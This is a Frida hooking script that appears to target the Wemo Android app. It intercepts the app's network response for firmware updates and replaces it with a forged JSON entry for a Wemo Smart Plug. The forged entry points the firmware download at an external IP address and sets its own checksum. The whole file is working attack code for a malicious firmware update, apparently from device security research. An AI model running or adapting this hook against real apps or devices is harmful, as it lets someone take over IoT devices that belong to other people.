function encodeHex(byteArray) {
    const HexClass = Java.use('org.apache.commons.codec.binary.Hex');
    const StringClass = Java.use('java.lang.String');
    const hexChars = HexClass.encodeHex(byteArray);
    return StringClass.$new(hexChars).toString();
}

setTimeout(function() {
    
Java.perform(function() {

    // var jAndroidLog = Java.use("android.util.Log"), jException = Java.use("java.lang.Exception");
    var jString = Java.use('java.lang.String');  
    var volleyResponse = Java.use("b.a.q.g.c.l0$b");
    volleyResponse.onResponse.implementation = function(a){
        var instr = a+" ";
        console.log("VOLLEY Response intercepted!");
        console.log(a);
        // var jTrace = jAndroidLog.getStackTraceString(jException.$new());
        if (instr.includes("pluginFirmware")) { 
            var injectionStr = "{\"pluginFirmware\":[{\"uniqueId\":\"uuid:Socket-1_0-M18AB033D21379\",\"modelCode\":\"Socket\",\"macAddress\":\"C4411ECED0A6\",\"firmwares\":[{\"versionRev\":\"20111600\",\"version\":\"WEMO_WW_4.00.20111600.PVT-RTOS-SNSV4\",\"url\":\"http://34.135.183.171/wemo/WEMO_WW_4.00.20111600.PVT-RTOS-SNSV4_tz.bin.enc\",\"hwVersion\":\"v4\",\"region\":\"WW\",\"checksum\":\"a2db26fa4a04ba0941804ed7e7a86f9c\",\"releaseNotes\":\"Wemo Smart Plug firmware release notes WW 20111600 PVT:• Network connection improvements and general bugs bunny fixes to enhance your Wemo's performance.\",\"models\":{},\"tags\":[]}]}]}"
            var aStr = Java.cast(a,jString);
            var strBytes = aStr.getBytes();
            console.log("volleyResponse.onResponse "+encodeHex(strBytes)+" "+JSON.stringify(strBytes));
            console.log("volleyResponse.onResponse INJECTED!!");
            console.log(a);
            console.log(injectionStr);
            var retval = this.onResponse(injectionStr);
            return retval;
        }
        var retval = this.onResponse(a);
        return retval;
    };

});

}, 0);

